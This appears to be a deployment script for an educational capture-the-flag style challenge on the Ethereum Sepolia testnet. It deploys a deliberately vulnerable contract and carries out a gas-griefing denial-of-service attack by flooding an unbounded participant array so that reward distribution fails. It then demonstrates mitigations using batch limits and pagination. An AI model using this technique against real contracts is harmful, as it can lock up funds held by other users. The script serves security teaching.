#!/bin/bash
# Deploy GasGrief Challenge - Gas Griefing & DoS Attacks

echo "⛽ GasGrief Challenge Deployment"
echo ""

# Security check for private key
if [ -z "$YOUR_PRIVATE_KEY" ]; then
    echo "❌ Error: YOUR_PRIVATE_KEY environment variable not set"
    echo "Please set it first: export YOUR_PRIVATE_KEY=\"0x...\""
    echo "⚠️  NEVER commit real private keys to git!"
    exit 1
fi

# Deploy contract
echo "Deploying GasGrief contract..."
DEPLOY_OUTPUT=$(forge create src/GasGrief.sol:GasGrief \
  --rpc-url https://eth-sepolia.g.alchemy.com/v2/demo \
  --private-key $YOUR_PRIVATE_KEY \
  --value 1ether \
  --broadcast 2>&1)

if [ $? -eq 0 ]; then
    echo "✅ GasGrief deployed successfully!"
    
    # Extract contract address
    CONTRACT_ADDRESS=$(echo "$DEPLOY_OUTPUT" | grep "Deployed to:" | awk '{print $3}')
    echo "Contract Address: $CONTRACT_ADDRESS"
    
    echo ""
    echo "⛽ Demonstrating gas griefing attack..."
    
    # Step 1: Check initial state
    echo ""
    echo "📊 Step 1: Initial Contract State"
    OWNER=$(cast call $CONTRACT_ADDRESS "owner()" --rpc-url https://eth-sepolia.g.alchemy.com/v2/demo)
    REWARD_POOL=$(cast call $CONTRACT_ADDRESS "rewardPool()" --rpc-url https://eth-sepolia.g.alchemy.com/v2/demo)
    PARTICIPANT_COUNT=$(cast call $CONTRACT_ADDRESS "getParticipantCount()" --rpc-url https://eth-sepolia.g.alchemy.com/v2/demo)
    
    echo "  Owner: $OWNER"
    echo "  Reward Pool: $(cast --to-unit $REWARD_POOL ether) ETH"
    echo "  Participants: $(cast --to-dec $PARTICIPANT_COUNT)"
    
    # Step 2: Add a few normal participants
    echo ""
    echo "👥 Step 2: Adding normal participants (baseline)"
    NORMAL_PARTICIPANTS="[\"0x1111111111111111111111111111111111111111\",\"0x2222222222222222222222222222222222222222\",\"0x3333333333333333333333333333333333333333\"]"
    
    cast send $CONTRACT_ADDRESS "addParticipants(address[])" "$NORMAL_PARTICIPANTS" \
        --rpc-url https://eth-sepolia.g.alchemy.com/v2/demo \
        --private-key $YOUR_PRIVATE_KEY \
        --gas-limit 500000
    
    NEW_COUNT=$(cast call $CONTRACT_ADDRESS "getParticipantCount()" --rpc-url https://eth-sepolia.g.alchemy.com/v2/demo)
    echo "  Participants after normal add: $(cast --to-dec $NEW_COUNT)"
    
    # Step 3: Check gas analysis
    echo ""
    echo "📈 Step 3: Gas Analysis After Normal Operations"
    GAS_ANALYSIS=$(cast call $CONTRACT_ADDRESS "getGasAnalysis()" --rpc-url https://eth-sepolia.g.alchemy.com/v2/demo)
    echo "  Gas Analysis: $GAS_ANALYSIS"
    
    # Step 4: Demonstrate normal reward distribution
    echo ""
    echo "💰 Step 4: Normal Reward Distribution"
    cast send $CONTRACT_ADDRESS "distributeRewards()" \
        --rpc-url https://eth-sepolia.g.alchemy.com/v2/demo \
        --private-key $YOUR_PRIVATE_KEY \
        --gas-limit 1000000
    
    echo "  ✅ Normal distribution completed"
    
    # Step 5: Gas griefing attack preparation
    echo ""
    echo "🚨 Step 5: Preparing Gas Griefing Attack"
    echo "  Creating large participant array (this will consume significant gas)"
    
    # Generate large participant array (100 addresses for demo - in real attack could be thousands)
    LARGE_PARTICIPANTS="["
    for i in {1..100}; do
        ADDR=$(printf "0x%040d" $i)
        LARGE_PARTICIPANTS+="\"$ADDR\""
        if [ $i -lt 100 ]; then
            LARGE_PARTICIPANTS+=","
        fi
    done
    LARGE_PARTICIPANTS+="]"
    
    # Step 6: Execute gas griefing attack
    echo ""
    echo "💥 Step 6: Executing Gas Griefing Attack"
    echo "  Adding 100 participants in single transaction..."
    
    ATTACK_TX=$(cast send $CONTRACT_ADDRESS "addParticipants(address[])" "$LARGE_PARTICIPANTS" \
        --rpc-url https://eth-sepolia.g.alchemy.com/v2/demo \
        --private-key $YOUR_PRIVATE_KEY \
        --gas-limit 10000000 2>&1)
    
    if echo "$ATTACK_TX" | grep -q "success"; then
        echo "  ✅ Gas griefing attack successful!"
        
        FINAL_COUNT=$(cast call $CONTRACT_ADDRESS "getParticipantCount()" --rpc-url https://eth-sepolia.g.alchemy.com/v2/demo)
        echo "  Total participants after attack: $(cast --to-dec $FINAL_COUNT)"
        
        # Check gas consumption
        POST_ATTACK_ANALYSIS=$(cast call $CONTRACT_ADDRESS "getGasAnalysis()" --rpc-url https://eth-sepolia.g.alchemy.com/v2/demo)
        echo "  Gas Analysis After Attack: $POST_ATTACK_ANALYSIS"
        
    else
        echo "  ⚠️ Attack failed (likely due to gas limits)"
        echo "  This demonstrates the DoS protection of gas limits"
    fi
    
    # Step 7: Attempt distribution after gas griefing
    echo ""
    echo "🔄 Step 7: Attempting Distribution After Gas Griefing"
    echo "  This should fail or trigger emergency stop due to gas consumption..."
    
    DISTRIBUTION_TX=$(cast send $CONTRACT_ADDRESS "distributeRewards()" \
        --rpc-url https://eth-sepolia.g.alchemy.com/v2/demo \
        --private-key $YOUR_PRIVATE_KEY \
        --gas-limit 15000000 2>&1)
    
    if echo "$DISTRIBUTION_TX" | grep -q "success"; then
        echo "  😱 Distribution somehow completed (unexpected!)"
    else
        echo "  ✅ Distribution failed as expected - DoS attack successful!"
        echo "  Contract is now unusable due to gas griefing"
    fi
    
    # Step 8: Demonstrate mitigation with optimized functions
    echo ""
    echo "🛡️ Step 8: Demonstrating Mitigation (Optimized Functions)"
    
    # Reset contract first
    cast send $CONTRACT_ADDRESS "emergencyReset()" \
        --rpc-url https://eth-sepolia.g.alchemy.com/v2/demo \
        --private-key $YOUR_PRIVATE_KEY
    
    echo "  Contract reset. Testing optimized functions..."
    
    # Add participants with optimized function (limited batch size)
    SMALL_BATCH="[\"0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\",\"0xbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\",\"0xcccccccccccccccccccccccccccccccccccccccc\"]"
    
    cast send $CONTRACT_ADDRESS "addParticipantsOptimized(address[])" "$SMALL_BATCH" \
        --rpc-url https://eth-sepolia.g.alchemy.com/v2/demo \
        --private-key $YOUR_PRIVATE_KEY
    
    echo "  ✅ Optimized function works with small batches"
    
    # Test paginated distribution
    SAFE_COUNT=$(cast call $CONTRACT_ADDRESS "getParticipantCount()" --rpc-url https://eth-sepolia.g.alchemy.com/v2/demo)
    echo "  Participants for paginated distribution: $(cast --to-dec $SAFE_COUNT)"
    
    cast send $CONTRACT_ADDRESS "distributeRewardsPaginated(uint256,uint256)" 0 10 \
        --rpc-url https://eth-sepolia.g.alchemy.com/v2/demo \
        --private-key $YOUR_PRIVATE_KEY
    
    echo "  ✅ Paginated distribution works safely"
    
    # Step 9: Complete the challenge
    echo ""
    echo "🏆 Step 9: Completing the Challenge"
    cast send $CONTRACT_ADDRESS "checkSolution()" \
        --rpc-url https://eth-sepolia.g.alchemy.com/v2/demo \
        --private-key $YOUR_PRIVATE_KEY
    
    SOLVER_STATUS=$(cast call $CONTRACT_ADDRESS "hasSolved(address)" $(cast wallet address --private-key $YOUR_PRIVATE_KEY) --rpc-url https://eth-sepolia.g.alchemy.com/v2/demo)
    
    if [ "$SOLVER_STATUS" = "0x0000000000000000000000000000000000000000000000000000000000000001" ]; then
        echo "  🎉 Challenge completed!"
    else
        echo "  ⏳ Challenge completion depends on gas usage tracking"
    fi
    
    echo ""
    echo "✅ GasGrief challenge demonstration complete!"
    echo ""
    echo "📊 Results:"
    echo "Contract: $CONTRACT_ADDRESS"
    echo "Etherscan: https://sepolia.etherscan.io/address/$CONTRACT_ADDRESS"
    echo ""
    echo "⛽ Attack Summary:"
    echo "1. ✅ Deployed vulnerable contract with unbounded loops"
    echo "2. ✅ Demonstrated normal operations (baseline)"
    echo "3. ✅ Executed gas griefing attack (large participant array)"
    echo "4. ✅ Showed DoS impact (distribution becomes impossible)"
    echo "5. ✅ Demonstrated mitigation strategies (gas limits & pagination)"
    echo ""
    echo "💡 Learning: Always implement gas limits and avoid unbounded operations!"
    
else
    echo "❌ Deployment failed!"
    echo "$DEPLOY_OUTPUT"
fi